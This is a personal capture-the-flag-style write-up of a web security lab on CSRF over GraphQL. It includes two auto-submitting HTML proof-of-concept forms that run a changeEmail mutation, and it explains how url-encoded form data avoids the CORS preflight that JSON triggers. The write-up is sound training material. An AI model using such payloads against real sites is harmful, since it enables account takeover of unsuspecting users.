# [GraphQL] Lab: Performing CSRF exploits over GraphQL (1)

---

![Untitled](%5BGraphQL%5D%20Lab%20Performing%20CSRF%20exploits%20over%20GraphQ%20e3284a644d6e41dbb9ee9c0802004939/Untitled.png)

**Schema:** 

![Untitled](%5BGraphQL%5D%20Lab%20Performing%20CSRF%20exploits%20over%20GraphQ%20e3284a644d6e41dbb9ee9c0802004939/Untitled%201.png)

lets visualize this: 

![Untitled](%5BGraphQL%5D%20Lab%20Performing%20CSRF%20exploits%20over%20GraphQ%20e3284a644d6e41dbb9ee9c0802004939/Untitled%202.png)

now to capture the request towards changing the email what we can use is the proxy to capture that GraphQL query and allow it to capture that so we can possibly build a CSRF PoC

![Untitled](%5BGraphQL%5D%20Lab%20Performing%20CSRF%20exploits%20over%20GraphQ%20e3284a644d6e41dbb9ee9c0802004939/Untitled%203.png)

generated CSRF PoC: 

```jsx
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0200c40475e16781e5f35300800023.web-security-academy.net/graphql/v1" method="POST" enctype="text/plain">
      <input type="hidden" name="&#123;&quot;query&quot;&#58;&quot;&#92;n&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#92;n&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#92;n&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#92;n&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#92;n&#32;&#32;&#32;&#32;&#125;&#92;n&quot;&#44;&quot;operationName&quot;&#58;&quot;changeEmail&quot;&#44;&quot;variables&quot;&#58;&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;test&#64;test&#46;ca&quot;&#125;&#125;&#125;" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

one of the issue I am having is due to the fact the content type of that data is JSON which means when **Content-Type Restrictions**: Modern web browsers enforce strict rules about making cross-origin HTTP requests with certain content types, such as `application/json`. 

- When a site tries to make a request to a different domain with content type `application/json`, the browser performs a preflight check using the CORS (Cross-Origin Resource Sharing) protocol.

**How do we by-pass this?** 

- This is not the case with content types like `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`, which can be used in simple cross-site POST requests without triggering CORS preflight checks.
- Lets try URL encoded.

by messing around with the GraphQL tab in repeater I was able to craft this payload: 

![Untitled](%5BGraphQL%5D%20Lab%20Performing%20CSRF%20exploits%20over%20GraphQ%20e3284a644d6e41dbb9ee9c0802004939/Untitled%204.png)

the changeEmail field requires variables to be defined. 

CSRF PoC: 

```jsx
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0200c40475e16781e5f35300800023.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation&#32;ChangeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#13;&#10;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#13;&#10;&#32;&#32;&#32;&#32;email&#13;&#10;&#32;&#32;&#125;&#13;&#10;&#125;" />
      <input type="hidden" name="variables" value="&#123;&#13;&#10;&#32;&#32;&quot;input&quot;&#58;&#32;&#123;&#13;&#10;&#32;&#32;&#32;&#32;&quot;email&quot;&#58;&#32;&quot;test&#64;test&#46;ca&quot;&#13;&#10;&#32;&#32;&#125;&#13;&#10;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![Untitled](%5BGraphQL%5D%20Lab%20Performing%20CSRF%20exploits%20over%20GraphQ%20e3284a644d6e41dbb9ee9c0802004939/Untitled%205.png)

and it worked: 

![Untitled](%5BGraphQL%5D%20Lab%20Performing%20CSRF%20exploits%20over%20GraphQ%20e3284a644d6e41dbb9ee9c0802004939/Untitled%206.png)

**LAB solved:** 

![Untitled](%5BGraphQL%5D%20Lab%20Performing%20CSRF%20exploits%20over%20GraphQ%20e3284a644d6e41dbb9ee9c0802004939/Untitled%207.png)